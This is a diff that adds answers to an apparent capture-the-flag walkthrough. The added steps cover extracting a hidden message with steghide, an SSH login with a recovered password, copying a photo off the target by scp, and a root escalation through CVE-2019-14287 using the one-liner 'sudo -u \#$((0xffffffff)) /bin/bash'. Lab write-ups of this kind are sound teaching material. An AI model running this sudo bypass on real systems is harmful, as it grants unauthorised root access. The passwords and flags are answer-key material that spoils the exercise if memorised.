@@ -44,3 +44,40 @@
 - Zip file password
 
 	- `alien`
+
+- Who is the other agent (in full name)?
+
+	- `steghide info cute-alien.jpg`, enter `y` and the passphrase (`Area51`).
+	- There is a message.txt inside
+	- `steghide extract -sf cute-alien.jpg`
+	- `james`
+
+- SSH password
+
+	- `hackerrules!`
+
+- What is the user flag?
+
+	- `ssh james@<TARGET_IP>` and then enter the password.
+	- `cat user_flag.txt`
+	- `b0**975e8******041**********13c7`
+
+- What is the incident of the photo called?
+
+	- Enable ssh on your machine
+	- `scp Alien_autospy.jpg YOUR-USER-HERE@YOUR-IP-HERE:Alien_autospy.jpg`
+	- Search that photo with Google Reverse Image.
+	- `Roswell Alien Autopsy`
+
+- CVE number for the escalation (Format: CVE-xxxx-xxxx)
+
+	- `sudo -l`
+	- `CVE-2019-14287` ([exploit-db](https://www.exploit-db.com/))
+
+- What is the root flag?
+
+	- `sudo -u \#$((0xffffffff)) /bin/bash`
+	- `id`
+	- `cat /root/root.txt`
+	- `b53**2f55b57******3341**********`
+	- `Deskel`
